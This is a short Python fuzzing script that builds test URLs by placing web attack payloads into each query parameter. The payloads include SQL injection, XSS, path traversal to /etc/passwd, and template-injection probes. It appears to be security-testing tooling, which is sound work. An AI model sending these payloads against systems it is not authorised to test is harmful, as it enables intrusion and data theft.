import copy
import urllib.parse

FUZZ_PAYLOADS = [
    "' OR 1=1 --",
    "<svg onload=alert(1)>",
    "../../../../etc/passwd",
    "%00",
    "99999999999999999999999999999999",
    "${7*7}",
    "{{7*7}}"
]

def generate_fuzz_urls(base_url: str, params: dict) -> list:
    fuzz_targets = []
    for key in params.keys():
        for payload in FUZZ_PAYLOADS:
            mutated = copy.deepcopy(params)
            mutated[key] = payload
            encoded = urllib.parse.urlencode(mutated)
            fuzz_targets.append(f"{base_url}?{encoded}")
    return fuzz_targets
